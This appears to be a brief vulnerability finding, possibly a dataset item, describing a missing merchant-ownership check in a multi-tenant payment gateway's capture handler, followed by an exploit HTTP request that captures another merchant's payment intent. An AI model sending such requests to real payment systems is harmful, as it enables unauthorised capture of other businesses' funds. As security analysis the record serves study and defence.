diagnosis: The payment capture handler fetches a Redis OM PaymentIntentRecord by its primary key intent_pk and captures funds via the gateway. It does not verify that intent.merchant_id matches current_user.merchant_id, allowing any merchant on the multi-tenant payment gateway to prematurely capture payments for transactions initiated by competitors.
exploit_request:
POST /checkout/intents/01HJ9910KLA8237BDC199042A/capture HTTP/1.1
Host: pay.gateway.io
Authorization: Bearer <merchant_jwt>
Content-Length: 0
